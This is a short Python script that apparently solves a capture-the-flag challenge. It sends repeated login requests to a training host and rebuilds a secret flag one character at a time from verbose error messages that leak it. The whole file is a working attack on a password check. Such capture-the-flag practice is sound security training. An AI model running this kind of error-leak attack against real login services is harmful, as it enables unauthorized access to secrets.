import requests
import json
import re

url = "http://password-login.challs.nazionale.olicyber.it/"

flag = [""] * 100

while True:
    r = requests.post(url + "api/login", json={"password":"palle"})

    data = json.loads(r.text)["error"]
    pos = int(data.split("[")[1].split("]")[0])
    char = data.split("!= ")[1].strip("'")

    flag[pos] = char
    print("".join(flag))